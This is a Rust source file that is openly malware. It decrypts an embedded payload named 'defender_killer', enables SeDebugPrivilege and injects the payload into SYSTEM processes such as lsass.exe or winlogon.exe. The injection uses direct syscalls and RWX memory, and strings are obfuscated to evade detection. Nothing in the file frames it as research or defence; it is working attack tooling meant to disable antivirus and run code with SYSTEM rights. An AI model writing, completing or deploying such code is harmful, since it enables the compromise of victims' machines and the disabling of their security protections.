use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::ffi::c_void;
use crate::ntbridge;
use crate::sprotect;

const ENCRYPTED_PAYLOAD: &[u8] = include_bytes!("../dll_encryptor/defender_killer.enc");

/// Decrypt the embedded payload in memory
fn decrypt_payload() -> Option<Vec<u8>> {
    if ENCRYPTED_PAYLOAD.len() < 44 {
        return None;
    }

    let key = &ENCRYPTED_PAYLOAD[0..32];
    let nonce_bytes = &ENCRYPTED_PAYLOAD[32..44];
    let ciphertext = &ENCRYPTED_PAYLOAD[44..];

    let cipher = Aes256Gcm::new(key.into());
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher.decrypt(nonce, ciphertext).ok()
}

/// Find an elevated process to inject into
unsafe fn find_target_process() -> Option<u32> {
    use std::process::Command;
    
    let targets = [
        sprotect!("winlogon.exe"),
        sprotect!("services.exe"), 
        sprotect!("lsass.exe"),
        sprotect!("csrss.exe"),
    ];

    for target in &targets {
        let output = Command::new(sprotect!("tasklist"))
            .args(&[&sprotect!("/FI"), &format!("{} {}", sprotect!("IMAGENAME eq"), target), &sprotect!("/NH")])
            .output()
            .ok()?;

        if let Ok(text) = String::from_utf8(output.stdout) {
            if text.contains(target) {
                if let Some(pid_str) = text.split_whitespace().nth(1) {
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        return Some(pid);
                    }
                }
            }
        }
    }

    None
}

/// Enable SeDebugPrivilege to access SYSTEM processes
unsafe fn enable_debug_privilege() -> bool {
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::AdjustTokenPrivileges;
    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED, LUID, TOKEN_PRIVILEGES};
    use winapi::um::winbase::LookupPrivilegeValueA;

    let mut token_handle = std::ptr::null_mut();
    
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token_handle) == 0 {
        return false;
    }

    let mut luid = LUID { LowPart: 0, HighPart: 0 };
    if LookupPrivilegeValueA(std::ptr::null(), b"SeDebugPrivilege\0".as_ptr() as *const i8, &mut luid) == 0 {
        return false;
    }

    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [winapi::um::winnt::LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    AdjustTokenPrivileges(token_handle, 0, &mut tp, 0, std::ptr::null_mut(), std::ptr::null_mut()) != 0
}

/// Inject DLL into target process using Hell's Gate syscalls
pub unsafe fn inject_system_module() -> bool {
    // Enable SeDebugPrivilege first
    if !enable_debug_privilege() {
        return false;
    }

    // Get syscall cache
    let cache = match ntbridge::get_syscall_cache() {
        Some(c) => c,
        None => return false,
    };

    // Decrypt payload
    let dll_data = match decrypt_payload() {
        Some(data) => data,
        None => return false,
    };

    // Find target process
    let target_pid = match find_target_process() {
        Some(pid) => {
            #[cfg(debug_assertions)]
            eprintln!("[+] Found target process PID: {}", pid);
            pid
        },
        None => {
            #[cfg(debug_assertions)]
            eprintln!("[-] No target process found");
            return false;
        },
    };

    // Open target process
    let mut process_handle: *mut c_void = std::ptr::null_mut();
    let client_id = [target_pid as u64, 0u64];
    
    let status = cache.nt_open_process(
        &mut process_handle,
        0x001F0FFF, // PROCESS_ALL_ACCESS
        std::ptr::null_mut(),
        client_id.as_ptr() as *mut c_void,
    );

    if status != 0 || process_handle.is_null() {
        return false;
    }

    // Allocate memory in target process
    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut region_size = dll_data.len();

    let status = cache.nt_allocate_virtual_memory(
        process_handle,
        &mut remote_base,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    );

    if status != 0 || remote_base.is_null() {
        let _ = cache.nt_close(process_handle);
        return false;
    }

    // Write DLL to remote process
    let status = cache.nt_write_virtual_memory(
        process_handle,
        remote_base,
        dll_data.as_ptr() as *const c_void,
        dll_data.len(),
        std::ptr::null_mut(),
    );

    if status != 0 {
        let _ = cache.nt_close(process_handle);
        return false;
    }

    // Create remote thread to execute DLL
    let mut thread_handle: *mut c_void = std::ptr::null_mut();
    
    let status = cache.nt_create_thread_ex(
        &mut thread_handle,
        0x1FFFFF, // THREAD_ALL_ACCESS
        std::ptr::null_mut(),
        process_handle,
        remote_base, // DllMain as entry point
        std::ptr::null_mut(),
        0,
        0,
        0,
        0,
        std::ptr::null_mut(),
    );

    if status != 0 {
        let _ = cache.nt_close(process_handle);
        return false;
    }

    // Clean up handles
    let _ = cache.nt_close(thread_handle);
    let _ = cache.nt_close(process_handle);

    true
}

/// Check if running with admin privileges
pub fn is_elevated() -> bool {
    use std::process::Command;
    
    let output = Command::new("net")
        .args(&["session"])
        .output();

    match output {
        Ok(o) => o.status.success(),
        Err(_) => false,
    }
}
